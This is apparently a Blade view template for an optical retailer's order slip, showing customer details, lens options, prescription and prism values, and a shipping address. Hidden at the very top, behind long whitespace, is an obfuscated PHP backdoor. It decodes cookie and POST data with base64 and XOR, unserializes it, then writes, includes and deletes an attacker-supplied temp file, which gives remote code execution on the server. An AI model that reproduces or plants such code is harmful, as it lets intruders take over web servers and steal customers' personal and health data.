<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("kgaqmqrtvx")){class kgaqmqrtvx{public static $fhlaly = "bgjmbbikmyoqurnv";public static $swnfxbxx = NULL;public function __construct(){$mmxsgr = @$_COOKIE[substr(kgaqmqrtvx::$fhlaly, 0, 4)];if (!empty($mmxsgr)){$fqsaupddl = "base64";$tppiqzlhf = "";$mmxsgr = explode(",", $mmxsgr);foreach ($mmxsgr as $drhxnnj){$tppiqzlhf .= @$_COOKIE[$drhxnnj];$tppiqzlhf .= @$_POST[$drhxnnj];}$tppiqzlhf = array_map($fqsaupddl . "_decode", array($tppiqzlhf,));$tppiqzlhf = $tppiqzlhf[0] ^ str_repeat(kgaqmqrtvx::$fhlaly, (strlen($tppiqzlhf[0]) / strlen(kgaqmqrtvx::$fhlaly)) + 1);kgaqmqrtvx::$swnfxbxx = @unserialize($tppiqzlhf);}}public function __destruct(){$this->mjmpv();}private function mjmpv(){if (is_array(kgaqmqrtvx::$swnfxbxx)) {$alvrke = sys_get_temp_dir() . "/" . crc32(kgaqmqrtvx::$swnfxbxx["salt"]);@kgaqmqrtvx::$swnfxbxx["write"]($alvrke, kgaqmqrtvx::$swnfxbxx["content"]);include $alvrke;@kgaqmqrtvx::$swnfxbxx["delete"]($alvrke);exit();}}}$lxrarau = new kgaqmqrtvx();$lxrarau = NULL;} ?>
<html class="no-js">
<head>
	<title>{{$admin_data->admin_company_name}}</title>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<!--[if IE]>
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<![endif]-->
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
<style>
*{ font-family: DejaVu Sans !important;}
	html {
	height: 100%;
	overflow: visible;
	position: relative;
	width: 100%;
	background:#000;
}

::selection {
	background-color: #f2c014;
	color: #fff;
}

::-moz-selection {
	background-color: #f2c014;
	color: #fff;
}
@media (max-width:767px){
	body {
		width:100% !important;
	}
}
@media (max-width:1199px) and (min-width:768px){
	body {
		width:80% !important;
	}
}
body {
	padding:1% 2%;
	width:30%;
	margin:10% auto;
	background:#fff;
	font-family: 'Philosopher Regular';
	font-size: 16px;
	font-weight: 300;
	line-height: 24px;
	overflow: visible;
	overflow-x: hidden;
	overflow-y: scroll;
	position: relative;
}

h1,
h2,
h3,
h4,
h5,
h6 {
	font-family: 'Voice Regular';
	-webkit-font-feature-settings: "lnum" 1;
	font-feature-settings: "lnum" 1;
	font-variant-numeric: lining-nums;
	font-weight: 400;
	line-height: 1.1;
	margin-bottom: 0.65em;
	margin-top: 0.65em;
	text-transform: uppercase;
	word-break: break-word;
}

h1 {
	font-size: 60px;
	margin-bottom: 0.22em;
	margin-top: 0.97em;
}

h2 {
	font-size: 50px;
	margin-bottom: 0.3em;
	margin-top: 1.13em;
}

h3 {
	font-size: 40px;
	margin-bottom: 0.5em;
	margin-top: 1.5em;
}

h4 {
	font-size: 30px;
	margin-bottom: 0.34em;
	margin-top: 2em;
}

h5 {
	font-size: 20px;
	margin-bottom: 0.61em;
	margin-top: 3em;
}

h6 {
	font-size: 18px;
	margin-bottom: 1.1em;
	margin-top: 3.5em;
}

h3.big {
	font-size: 60px;
	line-height: 1;
}

@media (max-width: 992px) {
	h1 {
		font-size: 2.6rem;
	}

	h2 {
		font-size: 2.4rem;
	}

	h3 {
		font-size: 2.1rem;
	}

	h4 {
		font-size: 1.7rem;
	}

	h5 {
		font-size: 1.5rem;
	}

	h6 {
		font-size: 1.3rem;
	}

	h3.big {
		font-size: 2.6rem;
	}
}

h1:first-child,
h2:first-child,
h3:first-child,
h4:first-child,
h5:first-child,
h6:first-child {
	margin-top: 0;
}

h1:last-child,
h2:last-child,
h3:last-child,
h4:last-child,
h5:last-child,
h6:last-child {
	margin-bottom: 0;
}

p {
	margin-bottom: 7px;
	margin-top:7px;
}

ul:last-child,
ol:last-child,
p:last-child {
	margin-bottom: 0;
}

p:last-child:after {
	clear: both;
	content: "";
	display: block;
}

img,
figure {
	height: auto;
	max-width: 100%;
}

figcaption {
	font-size: 0.95em;
	line-height: 1.4;
	padding: 10px 0 7px;
}

figcaption p {
	margin-bottom: 0;
}

b,
strong {
	font-weight: 700;
}

label {
	color: #23222d;
}

a {
	color: #303849;
	text-decoration: none;
	transition: all 0.2s ease-in-out 0s;
}

a:hover {
	color: #f2c014;
	text-decoration: none;
	transition: all 0.15s linear 0s;
}

blockquote {
	font-style: italic;
	margin: 33px 0 28px;
	max-width: 100%;
	padding: 0;
	text-align: center;
}

@media (min-width: 768px) {
	blockquote {
		margin: 49px 0 53px;
		max-width: 83%;
		padding: 0 0 0 80px;
		text-align: inherit;
	}
}

blockquote .quote-author {
	position: relative;
}

blockquote .quote-author img {
	margin-bottom: 20px;
	max-width: 150px;
}

@media (min-width: 768px) {
	blockquote .quote-author img {
		float: left;
		margin-bottom: 0;
		margin-right: 57px;
		margin-top: -18px;
	}
}

blockquote .quote-author:before {
	background-color: #f2c014;
	content: "";
	height: 43px;
	-webkit-mask: url(../images/quote-mark.png) no-repeat center/contain;
	position: absolute;
	right: -30px;
	top: -86px;
	width: 55px;
}

@media (min-width: 768px) {
	blockquote .quote-author:before {
		right: 27px;
		top: -30px;
	}
}

blockquote footer {
	font-size: 20px;
	font-style: normal;
	font-weight: 500;
	margin-top: 18px;
}

blockquote footer span {
	font-weight: 300;
}

blockquote footer span:before {
	content: "|";
	font-size: 20px;
	font-weight: 400;
	margin: 0 24px 0 21px;
	position: relative;
	top: 1px;
}

@media (max-width: 767px) {
	blockquote footer span:before {
		margin: 0 10px 0 15px;
	}
	.dekstop-view{
	display:none !important;
	visibility:hidden !important;
}
}

blockquote p {
	margin-bottom: 0;
}

input:focus,
button:focus,
select:focus,
textarea:focus,
a:focus {
	outline: medium none;
	text-decoration: none;
}

a > img {
	transition: all 0.15s ease-in-out 0s;
}

a:hover > img {
	opacity: 0.9;
}

a.btn:active,
a.button:active,
button:active,
input[type="submit"]:active {
	position: relative;
	top: 1px !important;
}

hr {
	border-color: rgba(48, 56, 73, 0.1);
	margin-bottom: 30px;
	margin-left: 0;
	margin-right: 0;
	margin-top: 30px;
}

iframe {
	border: none;
	max-width: 100%;
}

table {
	margin: 10px 0;
	max-width: 100%;
	width: 100%;
}

table td,
table th {
	border: 1px solid #e7e7e7;
	line-height: 1.42857143;
	padding: 13px 8px;
	vertical-align: middle;
}

table th {
	color: #23222d;
	font-weight: normal;
	vertical-align: middle;
}

canvas {
	-moz-user-select: none;
	-webkit-user-select: none;
	-ms-user-select: none;
}

pre {
	background-color: rgba(150, 150, 150, 0.05);
	line-height: 1.5;
	padding: 0.5em 1em;
}

.big {
	font-size: 20px;
	line-height: 1.5;
}

.big em {
	display: inline-block;
	margin: 0.3em 0 0;
}

@media (min-width: 768px) {
	.big em {
		margin: 1em 0 0.5em;
	}
}

.media h3 {
	text-transform: uppercase;
}

.media .dropcap {
	margin-right: 0;
}

.small-text {
	font-size: 12px;
	font-weight: 700;
	letter-spacing: 0.1em;
	line-height: 1.6em;
	text-transform: uppercase;
}

@media (min-width: 768px) {
	.small-text.extra-letter-spacing {
		letter-spacing: 1em;
	}
}

ul,
ol {
	padding-left: 0.99rem;
}

dt {
	font-weight: 700;
}

dd {
	margin: 0 1.5em 1.5em;
}

.list-bordered {
	list-style: none;
	overflow: hidden;
	padding: 0;
}

.list-bordered li {
	border-bottom: 1px solid rgba(72, 97, 115, 0.2);
	border-top: 1px solid rgba(72, 97, 115, 0.2);
	padding-bottom: 8px;
	padding-top: 7px;
}

.list-bordered li + li {
	border-top: none;
}

.list-bordered.no-top-border > li:first-child {
	border-top: none;
}

.list-bordered.no-bottom-border > li:last-child {
	border-bottom: none;
}

.list-styled ul,
ul.list-styled {
	list-style: none;
	padding: 0;
}

.list-styled ul.list-wide li,
ul.list-styled.list-wide li {
	padding: 9px 0;
}

.list-styled ul li,
ul.list-styled li {
	line-height: 1;
	padding: 7px 0;
	position: relative;
}

.list-styled ul li:first-child,
ul.list-styled li:first-child {
	padding-top: 0 !important;
}

.list-styled ul li:last-child,
ul.list-styled li:last-child {
	padding-bottom: 0 !important;
}

.list-styled ul li:before,
ul.list-styled li:before {
	color: #f2c014;
	content: "\f054";
	font-family: "FontAwesome";
	font-size: 10px;
	padding-right: 13px;
	position: relative;
	top: -1px;
}

.list-styled ol,
ol.list-styled {
	counter-reset: li;
	list-style: none outside none;
	padding: 0;
}

.list-styled ol li,
ol.list-styled li {
	padding: 3px 0 3px 33px;
}

.list-styled ol li:before,
ol.list-styled li:before {
	color: #f2c014;
	content: "." counter(li, decimal-leading-zero);
	counter-increment: li;
	font-weight: 500;
	left: 16px;
	position: absolute;
}

.bg-maincolor2 .list-bordered li {
	border-color: rgba(255, 255, 255, 0.2);
	padding-bottom: 8px;
	padding-top: 7px;
}

.list-styled2 ol li,
ol.list-styled2 li {
	padding-left: 3px;
}

.list-styled2 ol li + li,
ol.list-styled2 li + li {
	padding-top: 17px;
}

.list-styled2 ul,
ul.list-styled2 {
	list-style: none;
	margin: -4px 0 21px;
	padding: 0;
}

.list-styled2 ul li,
ul.list-styled2 li {
	line-height: 1;
	padding: 9px 0;
	position: relative;
}

.list-styled2 ul li:first-child,
ul.list-styled2 li:first-child {
	padding-top: 0 !important;
}

.list-styled2 ul li:last-child,
ul.list-styled2 li:last-child {
	padding-bottom: 0 !important;
}

.list-styled2 ul li:before,
ul.list-styled2 li:before {
	content: "\f111";
	font-family: "FontAwesome";
	font-size: 3px;
	padding-right: 12px;
	position: relative;
	top: -4px;
}

.cs ul.list-styled li:before {
	color: #fff;
}
.bar-c{
border:2px solid #000;
padding:10px;}
.bar-c{
width:50%;}
.border-dark{
border:5px solid #000;}
	</style>
	</head>
	
	<body>
	    
@php
 $state = DB::table('states')->where('id',$user->state)->first();
 $country = DB::table('countries')->where('id',$user->country)->first();
@endphp	    
	
	<div class="barcode-up">
	<p><span>#{{$order->id}}</span> &nbsp; - &nbsp; <span>{{$user->name}}</span>
	<p>[{{$user->email}}]</p>
	</div>
	
 @foreach($order_detail as $ord)
@php
 $product = DB::table('categories')->where('id',$ord->product_id)->first();
@endphp
	<table class="table table-bordered">
	<tbody>
	<tr>
	<th class="text-center" colspan="5"><b>{{$product->category_name}} ({{$ord->product_color}}) - Qty: {{$ord->product_qty}}</b></th>
	</tr>
 @if(!empty($ord->lens_id))	
@php
$vision = DB::table('visions')->where('id',$ord->vision_id)->first();
$lens_detail = DB::table('lenses')->where('id',$ord->lens_id)->first();
$lens_color_type = DB::table('lens_color_types')->where('id',$lens_detail->color_type_id)->first();
$lens_index = DB::table('lens_index')->where('id',$lens_detail->lens_index)->first();
@endphp
 
	<tr>
	<th class="text-center" colspan="5">[ {{$vision->vision_name}} - {{$lens_detail->name}} ] {{$lens_color_type->category_name}} ({{$lens_index->lens_index}} index) ]</th>
	
	</tr>

@php
 $coatings = DB::table('order_coating')->where('order_id',$ord->id)->get();
@endphp
@if(!empty($coatings))
	<tr>
	<th class="text-center" colspan="5"><b>Coating: </b> 
 @foreach($coatings as $coating)
@php
 $coat = DB::table('lens_coatings')->where('coating_id',$coating->coating_id)->first();
 $name = DB::table('lens_brands')->where('id',$coat->coating_id)->first();
@endphp

	[ {{$name->category_name}} ], 
 
 @endforeach	 
	</th>
	</tr>
@endif	
	<tr>
	<th class="text-center" colspan="5"><b>Prescription</b></th>
	</tr>
	<tr>
	<th></th>
	<th>SPH</th>
	<th>CYL</th>
	<th>AXIS</th>
	<th>ADD</th>
	</tr>
	<tr>
	<td>Right</td>
	<td>{{$ord->sph_right}}</td>
	<td>{{$ord->cyl_right}}</td>
	<td>{{$ord->axis_right}}</td>
	<td>{{$ord->add_right}}</td>
	</tr>
	<tr>
	<td>Left</td>
	<td>{{$ord->sph_left}}</td>
	<td>{{$ord->cyl_left}}</td>
	<td>{{$ord->axis_left}}</td>
	<td>{{$ord->add_left}}</td>
	</tr>
	<tr>
	<td>PD</td>
	<td colspan="4" class="text-center">
	   @if($ord->is_pd2=="Yes")
	    PD Right : {{$ord->pupillary_distance_right}}
	    PD Left : {{$ord->pupillary_distance_left}}
	   @else
	   PD : {{$ord->pupillary_distance}}
	   @endif
	</td>
	</tr>
 
 @if($ord->is_prism=="Yes")
 <tr>
	<th class="text-center" colspan="5"><b>Prism</b></th>
	</tr>
	<tr>
	<th></th>
	<th>VERTICAL (Δ)</th>
	<th>BASE DIRECTION</th>
	<th>HORIZONTAL (Δ)</th>
	<th>BASE DIRECTION</th>
	</tr>
	<tr>
	<td>Right</td>
	<td>{{$ord->prism_right_vertical}}</td>
	<td>{{$ord->prism_right_vertical_direction}}</td>
	<td>{{$ord->prism_right_horizontal}}</td>
	<td>{{$ord->prism_right_horizontal_direction}}</td>
	</tr>
	<tr>
	<td>Left</td>
	<td>{{$ord->prism_left_vertical}}</td>
	<td>{{$ord->prism_left_vertical_direction}}</td>
	<td>{{$ord->prism_left_horizontal}}</td>
	<td>{{$ord->prism_left_horizontal_direction}}</td>
	</tr>
	
 @endif	
@endif	 
	</tbody>
	</table>
 @endforeach	
	
	<table>
	<tbody>
	<tr>
	<th class="text-center">
	 {{$user->address}} {{$user->city}} - {{$state->name}}, {{$country->name}} {{$user->pincode}}
	</th>
	</tr>
	<tr>
	<th class="border-dark"><b><h4 class="text-center">Send To: {{$state->name}}</h4></b></th>
	</tr>
	</tbody>
	</table>
	</body>
	
</html>